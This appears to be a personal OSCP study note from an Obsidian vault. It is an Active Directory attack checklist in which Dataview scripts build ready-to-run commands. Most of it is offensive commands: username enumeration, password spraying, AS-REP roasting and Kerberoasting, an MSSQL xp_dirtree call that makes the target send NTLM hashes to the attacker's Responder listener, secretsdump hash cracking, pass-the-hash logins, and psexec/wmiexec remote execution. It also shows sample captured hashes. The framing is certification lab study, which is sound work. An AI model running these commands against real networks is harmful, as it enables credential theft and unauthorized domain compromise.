
## Discovering Domain Name
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ldapsearch -x -H ldap://${ip} -s base namingContexts`;

dv.paragraph("```bash\n" + command + "\n```");
```
Add hosts to /etc/hosts 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `echo "${ip} ${discoveredDomain}" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---
## Port 53 : DNS

## DNS Zone Transfer
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `dig axfr ${ip} ${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```

---
## Port 88 : Kerberos

## No creds at all : Kerbrute force usernames

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `kerbrute userenum -d ${discoveredDomain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```

## looking for Users : looksupid --rid-brute
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = ` nxc smb ${ip} -u 'asdf' -p '' --rid-brute`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260910111923.png]]

Add these usernames into user_list

---

## Only User Obtained : Check Pre-Auth As-rep Kerberoasting

### Why Scan for Pre-Authentication?

Normally, Kerberos uses **Pre-Authentication** to prevent password guessing:

1. When a user requests a ticket (AS-REQ), Kerberos requires them to encrypt the current timestamp using a key derived from their password.
    
2. The Domain Controller (DC) decrypts it. If correct, the DC knows the user has the password and issues a Ticket Granting Ticket (TGT).
    

However, if an account has the setting **"Do not require Kerberos pre-authentication"** (`DONT_REQ_PREAUTH`) enabled in Active Directory:

- Anyone can send an AS-REQ to the DC asking for an authentication ticket on behalf of that username.
    
- Because pre-authentication is turned off, the DC **immediately sends back an AS-REP response** containing an encrypted ticket payload.
    
- That payload is encrypted with the target user's password hash.

The AS-REP (Authentication Server Response) is an encrypted Kerberos Ticket-Granting Ticket (TGT) for a user account whose Kerberos pre-authentication is disabled.

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";const ip = page?.IP ?? "NO IP FOUND";

const command = `impacket-GetNPUsers -request -usersfile Users.txt ${discoveredDomain}/ -dc-ip ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Password Spraying : Same PW as User

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `nxc smb ${ip} -u users -p users --continue-on-success`;

dv.paragraph("```bash\n" + command + "\n```");
```

---
### password spray  
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `nxc smb ${ip} -u users -p [pw] --continue-on-success | grep '[+]'`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

## Port 1433 MSSQL Database

### Get Net-NTLMv2

Try to get MSSQL to read a smb share off my KALI ATTACKER, which sends a hash that gets caught by responder listener

Open Listener
```
sudo responder -I tun0
```

In MSSQL database query
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `EXEC xp_dirtree '\\\\${KaliIP}\\share', 1, 1`;

dv.paragraph("```bash\n" + command + "\n```");
```

## Both User and PW Obtained : NetExec Credential Usage Sweep

Upon Entry, Once Creds for unknown usage is obtained, use [[NetExec]]to check across all services, nxc-sweep is used to automatically check all services

Custom Details
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u '[USER]' -p '[PASSWORD]'`;

dv.paragraph("```bash\n" + command + "\n```");
```
user and password list
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u users -p passwords`;

dv.paragraph("```bash\n" + command + "\n```");
```
In NetExec (and its predecessor CrackMapExec), seeing (Pwn3d!) next to a set of credentials means that the provided username and password are valid and possess administrative or code execution privileges on that target

[[5985 5986 WinRM]]
[[Synced OSCP Notes/Small Toolkit/Tools/Evil-Winrm|Evil-Winrm]]

---

## NMAP Vuln Script Scan

#### TCP
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo nmap -sVC -vvv ${ip} --script vuln`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### UDP
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo nmap -sV -sC -sU -vvv ${ip} --script vuln`;

dv.paragraph("```bash\n" + command + "\n```");
```

---
## Time Sync

Syncs our machine with the Domain server’s time as if we have more than a 5 min gap we will have issues.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo rdate -s ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

## LDAP 389
[[389 LDAP]]
Try to ping yourself with a listener opener, the printer might try to authenticate back to listener using the password accidentally

Then try LDAP dump. There might be password and username

---

# cPassword

we can use `gpp-decrypt` which uses AES-256 key to decrypt the data. `gpp-decrypt` is a utility specifically designed to decrypt the `cPassword` (or "cipher-password") attribute found in Group Policy Preferences (GPP) XML files on a Windows domain.

```
gpp-decrypt [hash]
```

---
## Service Accounts : Requires PW

Whenever getting access to domain credentials it is important to test a few of the tools from `impacket`. In this case we will use `GetUserSPNs.py` to extract encrypted passwords of any kerberoastable service accounts.

User:: svc_deploy
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine"); const ip = page?.IP ?? "NO IP FOUND"; const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"; const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit"); const user = pagea?.["User"] ?? "NO USER FOUND";
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine"); const ip = page?.IP ?? "NO IP FOUND"; const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"; const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit"); const user = pagea?.["User"] ?? "NO USER FOUND"; // Fixed: changed page? to pagea? const command = `impacket-GetUserSPNs -request -dc-ip ${ip} ${discoveredDomain}/${user}`; dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const ip = page?.IP ?? "NO IP FOUND";
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
const user = pagea?.["User"] ?? "NO USER FOUND"; // Fixed: changed page? to pagea?

const command = `impacket-GetUserSPNs -request -dc-ip ${ip} ${discoveredDomain}/${user}`;

dv.paragraph("```bash\n" + command + "\n```");

```

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## Impacket-secretsdump

If following files are available :

1. ntds.dit
2. SYSTEM
3. SAM

[[Impacket-secretsdump]]

Paste the output into hash.txt

Filter the hashes 

```
cat hash.txt|cut -d : -f 4
```

https://crackstation.net/

Grep the cracked hash to find out which user the password belongs to
```
grep -r '12579b1666d4ac10f0f59f300776495f' hash.txt
```

---

## Impacket-secretsdump pt2

Also keep in mind, we may be able to use any of these hashes to get access to the box, so long as, they are a valid user _and_ that user is part of the Remote Management group. Let’s check by adding all the names to a file called names.txt and changing the contents of our hashes file to contain _only_ hashes. Then we will use both names.txt and our revised hashes file with crackmapexec.

![[Pasted image 20260820224339.png]]

![[Pasted image 20260820224345.png]]
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `nxc winrm ${ip} -u names.txt -H hashes`;

dv.paragraph("```bash\n" + command + "\n```");
```
```powershell
WINRM       192.168.242.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

(Pwn3d!) means admin access

---

Transfer [[PowerView.ps1]] to target first

Verify commands are loaded
```powershell
Get-Command Get-DomainUser
```
 
 2. Query all active user accounts with an SPN set 

 ```powershell
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
 ```
 
![[Pasted image 20260817222346.png]]

Kerberoasting is a technique that allows attackers to request a Kerberos ticket for a service associated with a Service Principal Name (SPN)

Transfer [[Rubeus.exe]] into VICTIM TARGET

Once Creds are obtained, use [[Runas]]

---

# Priv Esc

[[PowerUp.ps1]]
[[LinWinPEAS]]
## whoami /priv
[[SeManageVolume]]
[[SeBackupPrivilege]]
[[SeRestorePrivilege]]
[[SeImpersonatePrivilege]]

## AutoLogon
```
reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
```

## whoami /groups

```
whoami /groups
```

```
net groups
```

Any foreign groups, research.

If Azure spotted, try ADSync
[[Azure Admins Group]]
[[LAPS]]
## Powershell History

MODIFY
A User:: sql_svc
```dataviewjs
const page = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
const user = page?.["A User"] ?? "NO USER FOUND";

const command = `cd C:\\Users\\${user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine`;

dv.paragraph("```bash\n" + command + "\n```");
```
### Show hidden files in Powershell Dir
```
dir -Force
```

[[ADCS]]



---

## LOGINs
# Admin SMB Login with Creds : psexec 

Now that we have these credentials we can run `psexec.py`. This `impacket` tool requires 3 things. The user needs to be a local admin on the target machine, it must have SMB open, and they must have administrative privileges to the default `IPC$` share.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `impacket-psexec ${discoveredDomain}/Administrator:'[PW}'@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

## wmiexec

MODIFY: 
hash:: 823452073d75b9d1cf70ebdf86c7f98e
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";

const command = `impacket-wmiexec -hashes '${hash}' -dc-ip ${ip} administrator@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```








